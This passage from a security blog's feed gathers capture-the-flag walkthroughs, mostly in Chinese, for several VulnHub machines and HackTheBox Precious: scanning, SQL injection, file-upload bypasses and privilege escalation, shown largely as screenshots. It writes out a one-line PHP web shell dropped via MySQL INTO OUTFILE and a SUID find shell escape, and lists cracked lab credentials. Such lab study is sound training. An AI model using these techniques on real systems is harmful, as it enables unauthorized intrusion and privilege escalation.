src="/2023/04/27/file-upload/ler/image-20230308164722763.png" alt="image-20230308164722763"></p><p>用john跑密码：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165310180.png" alt="image-20230308165310180"></p><p>用John&#x2F;incorrect登录后台：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165344905.png" alt="image-20230308165344905"></p><p>成功获得管理员权限。</p><p>尝试寻找上传点传马或者改服务端文件，在插件处发现可以上传文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165444017.png" alt="image-20230308165444017"></p><p>直接上传，到uploads目录查看，上传成功：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165511905.png" alt="image-20230308165511905"></p><p>这里如果没找到上传点，可以直接用mysql写马：</p><p><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;/var/www/https/blogblog/wp-content/uploads/cmd1.php</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174104145.png" alt="image-20230308174104145"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174122155.png" alt="image-20230308174122155"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174138286.png" alt="image-20230308174138286"></p><p>连蚁剑，注意需要忽略https证书，不然会连接失败：</p><img src="vulnhub-Stapler/image-20230308165627564.png" alt="image-20230308165627564" style="zoom:50%;" /><p>成功连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165610387.png" alt="image-20230308165610387"></p><p>弹shell到kali，pty：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170259336.png" alt="image-20230308170259336"></p><p>home目录下存在很多文件夹，内容都为空。</p><p>查看一下history文件，由于存在很多exit命令，使用grep排除：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170545936.png" alt="image-20230308170545936"></p><p>发现peter和JKanode用户的密码。</p><p>JKanode：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170814399.png" alt="image-20230308170814399"></p><p>peter：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170939917.png" alt="image-20230308170939917"></p><p>直接sudo提权，可以执行任意命令，拿到flag。</p><p>同时拿到www低权限之后，可以使用CVE-2021-4034提权，几乎通杀：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171520442.png" alt="image-20230308171520442"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_PwnOS2.0</title>
    <link href="/2023/04/26/vulnhub-PwnOS2-0/"/>
    <url>/2023/04/26/vulnhub-PwnOS2-0/</url>
    
    <content type="html"><![CDATA[<h1 id="PwnOS2-0"><a href="#PwnOS2-0" class="headerlink" title="PwnOS2.0"></a>PwnOS2.0</h1><p>首先nmap扫描端口，发现22，25，80，110等开放：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321135938360.png" alt="image-20230321135938360"></p><p>nikto扫一下80的http服务：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140053612.png" alt="image-20230321140053612"></p><p>发现了一些敏感目录。</p><p>info目录为phpinfo:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140123549.png" alt="image-20230321140123549"></p><p>includes:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140140442.png" alt="image-20230321140140442"></p><p>login.php为登录页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140320230.png" alt="image-20230321140320230"></p><p>register.php为注册页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140330516.png" alt="image-20230321140330516"></p><p>注册用户<a href="mailto:&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a>，未发现有用信息。</p><p>接下来考虑通过login.php来getshell，在email字段输入单引号，报错：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140613604.png" alt="image-20230321140613604"></p><p>明显存在sql注入，并且报错提示数据库为mysql。</p><p>burp抓包直接跑sqlmap，加上–dbms mysql参数：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140853513.png" alt="image-20230321140853513"></p><p>存在注入，–dump，查看user&#x2F;pass：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141528736.png" alt="image-20230321141528736"></p><p><a href="mailto:&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;">&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;</a>是注册的测试账号，尝试使用<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;</a>账号登录&#x2F;</p><p>密码为md5，解开后为killerbeesareflying，登录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141719166.png" alt="image-20230321141719166"></p><p>登录成功，但是没有可用信息，回到sqlmap，直接–os-shell:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141951074.png" alt="image-20230321141951074"></p><p>成功拿到shell，为www-data权限，但是此处的shell无法弹到kali。</p><p>在kali上寻找php马，传到靶机上：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142452841.png" alt="image-20230321142452841"></p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142229760.png" alt="image-20230321142229760"></p><p>本地开启监听，成功连上靶机：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142252180.png" alt="image-20230321142252180"></p><p>在当前目录下发现mysqli_connect.php文件，并发现密码root&#x2F;goodday:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142626934.png" alt="image-20230321142626934"></p><p>尝试登录mysql，失败，登录ssh同样失败。</p><p>回到上级目录，也存在mysqli_connect.php文件，查看发现另一组账号root&#x2F;root@ISIntS:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142650060.png" alt="image-20230321142650060"></p><p>ssh登录，成功拿到root权限：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142837619.png" alt="image-20230321142837619"></p><p>同时该密码可以登录mysql，因此尝试udf提权。</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155456474.png" alt="image-20230321155456474"></p><p>首先查看secure_file_priv，如果值为空，则可以提权：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155715082.png" alt="image-20230321155715082"></p><p>接下来查看compile选项：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155755619.png" alt="image-20230321155755619"></p><p>linux，64位。</p><p>最后查看plugin路径，如果没有需要自行创建，此处存在：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155836405.png" alt="image-20230321155836405"></p><p>使用sqlmap直接将udf.so文件传到plugin目录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143053212.png" alt="image-20230321143053212"></p><p>此处的so文件使用的是msf自带的，如果使用sqlmap中的，需要先进行解码。</p><p>msf中路径为：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321160832973.png" alt="image-20230321160832973"></p><p>分别对应了linux和windows中的32&#x2F;64位文件，此处使用的是lib_mysqludf_sys_64.so。</p><p>上传之后，默认会多出一个sys_eval方法，但是不会回显，再手动添加一次，returns string：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321153548843.png" alt="image-20230321153548843"></p><p>此时查询方法，存在sys_eval，执行whoami，是root权限，提权成功。</p><p>为了后续操作，给find加上suid：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143316978.png" alt="image-20230321143316978"></p><p>从www-data权限，使用suid提权，<code>touch 1.txt, find 1.txt -exec &#39;/bin/sh&#39; \;</code>，成功提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Pwnlab</title>
    <link href="/2023/04/26/vulnhub-Pwnlab/"/>
    <url>/2023/04/26/vulnhub-Pwnlab/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwnlab"><a href="#Pwnlab" class="headerlink" title="Pwnlab"></a>Pwnlab</h1><p>nmap扫端口&amp;服务：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323110917405.png" alt="image-20230323110917405"></p><p>主要是rpc和80端口的http服务。</p><p>使用rpcinfo进行探测：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111530034.png" alt="image-20230323111530034"></p><p>无有效信息。</p><p>dirsearch爆破后台敏感目录：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111545504.png" alt="image-20230323111545504"></p><p>首先直接访问80端口：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134559022.png" alt="image-20230323134559022"></p><p>访问&#x2F;upload:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134621886.png" alt="image-20230323134621886"></p><p>很明显为上传的文件。</p><p>接着访问&#x2F;upload.php:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134633666.png" alt="image-20230323134633666"></p><p>提示需要登录。</p><p>接下来访问login页面，出现登录框：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134652498.png" alt="image-20230323134652498"></p><p>burp抓包：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135618265.png" alt="image-20230323135618265"></p><p>输入单引号，无变化，保存报文内容跑sqlmap，无果。</p><p>对&#x2F;login.php进行同样的尝试：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135734466.png" alt="image-20230323135734466"></p><p>同样失败。</p><p>尝试对upload发送options请求：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135830977.png" alt="image-20230323135830977"></p><p>不允许put方法，无法直接写马。</p><p>仔细观察流量，发现登录页面的url为&#x2F;?page&#x3D;login，考虑存在文件包含漏洞。</p><p>直接尝试&#x2F;etc&#x2F;passwd：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140414126.png" alt="image-20230323140414126"></p><p>无回显。</p><p>尝试伪协议读取源码。目前url为<a href="http://192.168.59.30/index.php?page=login%EF%BC%8C%E8%80%8Cconfig.php%E4%B8%BAhttp://192.168.59.30/config.php%EF%BC%8C%E5%9B%A0%E6%AD%A4%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%EF%BC%9A">http://192.168.59.30/index.php?page=login，而config.php为http://192.168.59.30/config.php，因此需要返回一级目录：</a></p><p><img src="/2023/04/27/file-upload/ab/image-20230323140649744.png" alt="image-20230323140649744"></p><p>成功读取，base64解密：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140713926.png" alt="image-20230323140713926"></p><p>得到数据库的账号密码，连接数据库：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141140279.png" alt="image-20230323141140279"></p><p>base64解密后，得到kent，mike和kane3个用户的密码。ssh连接失败，端口未开放：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141906558.png" alt="image-20230323141906558"></p><p>无法直接ssh，因此登录尝试文件上传：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323142523888.png" alt="image-20230323142523888"></p><p>上传php马，提示不允许的后缀，只能上传图片。</p><p>首先考虑apache多后缀解析漏洞，上传pwnlab.php.jpg:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144220196.png" alt="image-20230323144220196"></p><p>未绕过。</p><p>接下来考虑上传图片马，再配合解析漏洞或者文件包含漏洞将其作为php文件解析。</p><p>&#x2F;index.php?page&#x3D;xxx该处存在文件包含漏洞，读取index.php源码：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144332964.png" alt="image-20230323144332964"></p><p>base64 decode：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144356432.png" alt="image-20230323144356432"></p><p>这里如果cookie中lang参数又存在文件包含。</p><p>先制作图片马，echo -e代表允许反斜杠解析，GIF89a为gif文件的文件头：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144857630.png" alt="image-20230323144857630"></p><p>上传成功：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145006507.png" alt="image-20230323145006507"></p><p>在cookie中输入gif文件的url，将php马包含，kali开启监听：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145136383.png" alt="image-20230323145136383"></p><p>成功获取shell。</p><p>当前为www-data权限，通过前面获取的账号密码，可以登录到kent和kane账户。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145609941.png" alt="image-20230323145609941"></p><p>kent目录下无文件，切换到kane，发现msgmike。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150733143.png" alt="image-20230323150733143"></p><p>msgmike为elf可执行文件，并且有suid，strings查看发现存在命令cat &#x2F;home&#x2F;mike&#x2F;msg.txt。</p><p>直接运行：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150837248.png" alt="image-20230323150837248"></p><p>提示无cat文件。因此直接新建cat文件，内容为&#x2F;bin&#x2F;bash，并且将$PATH参数修改，默认先使用我们新建的cat：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323151050920.png" alt="image-20230323151050920"></p><p>成功提权到mike，此时记得将$PATH恢复。</p><p>进入&#x2F;home&#x2F;mike目录下，存在msg2root文件，通过命名判断，需要通过该文件从mike提权到root权限。</p><p>将msg2root放入ida：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152452183.png" alt="image-20230323152452183"></p><p>发现system函数。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152547004.png" alt="image-20230323152547004"></p><p>并且msg2root为root权限，因此考虑直接使用msg2root执行&#x2F;bin&#x2F;bash命令拿到root shell。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152844893.png" alt="image-20230323152844893"></p><p>这里类似于远程代码执行漏洞，通过；截断即可执行命令，&#x2F;bin&#x2F;bash失败，尝试&#x2F;bin&#x2F;sh:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152925140.png" alt="image-20230323152925140"></p><p>成功。经过尝试&amp;等符号同样可行。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Mr-robot</title>
    <link href="/2023/04/26/vulnhub-Mr-robot/"/>
    <url>/2023/04/26/vulnhub-Mr-robot/</url>
    
    <content type="html"><![CDATA[<h1 id="Mr-robot"><a href="#Mr-robot" class="headerlink" title="Mr-robot"></a>Mr-robot</h1><p>nmap扫描，开放了80和443端口：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143637974.png" alt="image-20230322143637974"></p><p>浏览器访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143728895.png" alt="image-20230322143728895"></p><p>后台目录爆破：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145023429.png" alt="image-20230322145023429"></p><p>发现robots.txt，访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145306410.png" alt="image-20230322145306410"></p><p>发现两个文件,fsocity.dic，key-1-of-3.txt，分别查看：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145336763.png" alt="image-20230322145336763"></p><p>其中fsocity.dic是一个字典，有80万行，接着访问key：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145351085.png" alt="image-20230322145351085"></p><p>看似为md5值，md5解密失败，从名称判断应该是3个key中的第一个。</p><p>dirsearch还发现了wp-login等目录，判断该网站为word press。</p><p>结合dic字典，进行账号爆破。首先对字典进行去重：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145213115.png" alt="image-20230322145213115"></p><p>去重后保存到new文件，有1万多行数据。</p><p>首先从lostpassword页面爆破用户名：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150401225.png" alt="image-20230322150401225"></p><p>对结果进行关键字匹配，成功爆破出Elliot。</p><p>使用该用户名，继续爆破密码：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150604710.png" alt="image-20230322150604710"></p><p>爆破出密码ER28-0652。</p><p>登录后台：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150644787.png" alt="image-20230322150644787"></p><p>在appearance模块中可以编辑php文件，最简单的方法是修改404.php，将马复制到404.php，任意输入不存在的url，报错，连接成功：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151001633.png" alt="image-20230322151001633"></p><p>此时为daemon权限。</p><p>进入home，发现存在robot目录，发现password.raw-md5，解密后得到robot用户的密码，并且成功得到第二个key。</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151015498.png" alt="image-20230322151015498"></p><p>接下来继续提权到root，sudo -l无可用命令，上传检查脚本：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151033460.png" alt="image-20230322151033460"></p><p>发现nmap有suid：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151207435.png" alt="image-20230322151207435"></p><p>nmap –interactive进入交互模式，起shell：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151416138.png" alt="image-20230322151416138"></p><p>成功拿到root权限，得到第三个key。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_FristiLeaks_1.3</title>
    <link href="/2023/04/26/vulnhub-FristiLeaks-1-3/"/>
    <url>/2023/04/26/vulnhub-FristiLeaks-1-3/</url>
    
    <content type="html"><![CDATA[<h1 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks_1.3"></a>FristiLeaks_1.3</h1><p>arp-scan获取目标ip 192.168.59.18：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307205944349.png" alt="image-20230307205944349"></p><p>masscan全端口扫描:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212119043.png" alt="image-20230307212119043"></p><p>nmap对开放端口进行服务探测：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212152487.png" alt="image-20230307212152487"></p><p>whatweb：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212239788.png" alt="image-20230307212239788"></p><p>dirsearch目录爆破：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212417837.png" alt="image-20230307212417837"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213101589.png" alt="image-20230307213101589"></p><p>综上，只开放了一个80端口，开启了apache服务，apache2.2.15+php5.3.3，linux操作系统，后台目录有&#x2F;cola,&#x2F;robots.txt,&#x2F;images,&#x2F;sisi,&#x2F;beer.</p><p>先访问web界面：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213538737.png" alt="image-20230307213538737"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213600829.png" alt="image-20230307213600829"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213610628.png" alt="image-20230307213610628"></p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213726384.png" alt="image-20230307213726384"></p><p>均无有效信息。</p><p>接下来尝试寻找php+apache漏洞。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213811701.png" alt="image-20230307213811701"></p><p>前两个版本均符合，尝试利用。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213906097.png" alt="image-20230307213906097"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213932426.png" alt="image-20230307213932426"></p><p>404.无cgi页面。</p><p>第二个脚本利用结果同样如此：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214017727.png" alt="image-20230307214017727"></p><p>404 not found.</p><p>继续从web页面寻找突破，根据首页的图片，尝试访问&#x2F;fristi:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214232322.png" alt="image-20230307214232322"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214806121.png" alt="image-20230307214806121"></p><p>经过简单的手注之后，无果，直接sqlmap：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214431409.png" alt="image-20230307214431409"></p><p>不存在sql注入。</p><p>爆破弱口令同样失败。</p><p>查看源代码，发现提示：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214859613.png" alt="image-20230307214859613"></p><p>作者名为eezeepz，并且使用了base64加密图片，往下飞发现base64密文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214950977.png" alt="image-20230307214950977"></p><p>base64解密，发现文件头PNG：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215107490.png" alt="image-20230307215107490"></p><p>保存为png查看：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215246674.png" alt="image-20230307215246674"></p><p>发现一串密码，keKkeKKeKKeKkEkkEk，登录：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215418880.png" alt="image-20230307215418880"></p><p>登录成功，来到文件上传页面。</p><p>上传正常jpg文件，成功：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215630815.png" alt="image-20230307215630815"></p><p>访问&#x2F;uploads&#x2F;conan.jpg:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215658986.png" alt="image-20230307215658986"></p><p>正常。</p><p>写马，改后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220022189.png" alt="image-20230307220022189"></p><p>失败，校验了后缀名，只能为png,jpg,gif。</p><p>考虑到apache版本为2.2.15，存在多后缀解析漏洞，直接加后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220110652.png" alt="image-20230307220110652"></p><p>成功，蚁剑连接：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220139843.png" alt="image-20230307220139843"></p><p>为低权限，apache，home目录下有3个用户，admin,eezeepz,fristigod:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220407606.png" alt="image-20230307220407606"></p><p>除了eezeepz目录，都没有权限访问，在eezeepz目录下发现notes.txt:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220524600.png" alt="image-20230307220524600"></p><p>可以发现如下信息：</p><p>作者jerry，即为&#x2F;home&#x2F;admin，该目录下有chmod,df,cat,echo,ps,grep,egrep等命令可以使用，在&#x2F;tmp&#x2F;目录下新建一个runthis文件，该文件里的内容会以admin的权限每分钟运行一次，结果保存在&#x2F;tmp&#x2F;cronresult中。</p><p>首先想到的是chmod命令，改变&#x2F;home&#x2F;admin权限：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221710113.png" alt="image-20230307221710113"></p><p>此时已经能够访问&#x2F;admin目录。</p><p>查看文件内容：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221828145.png" alt="image-20230307221828145"></p><p>从命名看出，cryptedpass.txt为加密后的密文，而cryptpass.py为加密脚本。</p><p>编写解密函数：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222312005.png" alt="image-20230307222312005"></p><p>解密得到明文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222356135.png" alt="image-20230307222356135"></p><p>可能是某个用户的密码，尝试su：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222439699.png" alt="image-20230307222439699"></p><p>先tty：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222639878.png" alt="image-20230307222639878"></p><p>蚁剑的虚拟终端无法成功，先传shell到kali，再用python：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222841090.png" alt="image-20230307222841090"></p><p>成功拿到fristigod权限。</p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223028627.png" alt="image-20230307223028627"></p><p>提示可以使用该 “doCom” 执行任何命令。</p><p>访问文件：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223554288.png" alt="image-20230307223554288"></p><p>为二进制文件。</p><p>有提示.&#x2F;program_name terminal_command.</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223705185.png" alt="image-20230307223705185"></p><p>来到同级目录，查看history文件，用法为sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom &lt;command&gt;</p><p>因此直接起新的终端：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223841372.png" alt="image-20230307223841372"></p><p>拿到root权限，获取flag。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_precious</title>
    <link href="/2023/04/26/htb-precious/"/>
    <url>/2023/04/26/htb-precious/</url>
    
    <content type="html"><![CDATA[<h1 id="precious"><a href="#precious" class="headerlink" title="precious"></a>precious</h1><h2 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h2><p>use nmap to discover open-ports and services:</p><p><img src="/2023/04/27/file-upload/image-20230426093453128.png" alt="image-20230426093453128"></p><p>Now we focus on its http service on <strong>port 80</strong>.</p><p>Access it by firefox browser(remember to modify your &#x2F;etc&#x2F;hosts):</p><p><img src="/2023/04/27/file-upload/image-20230426093615323.png" alt="image-20230426093615323"></p><p>It seems that this website would help us convert web page to a pdf file. I tried <code>aaa</code> in the search bar:</p><p><img src="/2023/04/27/file-upload/image-20230426093935361.png" alt="image-20230426093935361"></p><p>I was reminded to provide a valid url. Naturally i think of starting a http-server on my kali and then entering my server address :</p><p><img src="/2023/04/27/file-upload/image-20230426094213706.png" alt="image-20230426094213706"></p><p>As excepted, a pdf was downloaded to my own machine. We can obviously find some familiar files by clicking it.</p><p>At this time all i can access is a <strong>pdf</strong> , as a result i use <code>exiftool</code> to analyse it.</p><p><img src="/2023/04/27/file-upload/image-20230426094838824.png" alt="image-20230426094838824"></p><p>What inspires me is <code>pdfkit v0.8.6</code>. I tried <code>searchsploit</code> subconsciously but found nothing:</p><p><img src="/2023/04/27/file-upload/image-20230426095134399.png" alt="image-20230426095134399"></p><p>Then i turned to google , finding a command injection vulnerability:</p><p><img src="/2023/04/27/file-upload/image-20230426095404721.png" alt="image-20230426095404721"></p><p>After trying several pocs, i found a python exp[<a href="https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765">nikn0laty&#x2F;PDFkit-CMD-Injection-CVE-2022-25765: Exploit for CVE-2022-25765 command injection in pdfkit &lt; 0.8.6 (github.com)</a>]:</p><p>step 1:</p><p>starting a python simple http-server:</p><p><img src="/2023/04/27/file-upload/image-20230426095817647.png" alt="image-20230426095817647"></p><p>step 2:</p><p>nc:</p><p><img src="/2023/04/27/file-upload/image-20230426095839251.png" alt="image-20230426095839251"></p><p>step 3:</p><p>python CVE-2022-25765.py -t target -a localhost -p localport:</p><p><img src="/2023/04/27/file-upload/image-20230426100735748.png" alt="image-20230426100735748"></p><h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><p>now we got a shell after exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426100950158.png" alt="image-20230426100950158"></p><p>By following below steps , i finally access a fully interactive shell:</p><ol><li>open a bash terminal</li><li>nc -nlvp 4444</li><li>ctrl+z to background the job</li><li>stty -echo raw</li><li>fg</li></ol><p><img src="/2023/04/27/file-upload/image-20230426101437784.png" alt="image-20230426101437784"></p><p>I found a secret directory in home path after looking around:</p><p><img src="/2023/04/27/file-upload/image-20230426101649976.png" alt="image-20230426101649976"></p><p><code>su henry</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426101922560.png" alt="image-20230426101922560"></p><p><code>user.txt</code> lies in <code>/home/henry</code> .</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>The last step is privilege escalation.</p><p>At first , i tried the most simple but effective way:</p><p><img src="/2023/04/27/file-upload/image-20230426102257184.png" alt="image-20230426102257184"></p><p>It appears that henry can run the file update_depencies.rb as root. Use cat to take a look at the file:</p><p><img src="/2023/04/27/file-upload/image-20230426102404182.png" alt="image-20230426102404182"></p><p>I’m stuck with <code>YAML.load</code> , it appears to be vulnerable to a deserialization attack. </p><p>Notice that the rb load a file named <strong>dependencies.yml</strong>. I download malicious yml from google to vefity the vul.</p><p><img src="/2023/04/27/file-upload/image-20230426102947150.png" alt="image-20230426102947150"></p><p><code>sudo /usr/bin/ruby /opt/update_dependencies.rb</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103016168.png" alt="image-20230426103016168"></p><p>It works!</p><p>Try to add suid to &#x2F;bin&#x2F;bash:</p><p><img src="/2023/04/27/file-upload/image-20230426103128047.png" alt="image-20230426103128047"></p><p>exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426103144435.png" alt="image-20230426103144435"></p><p><code>/bin/bash -p</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103206671.png" alt="image-20230426103206671"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
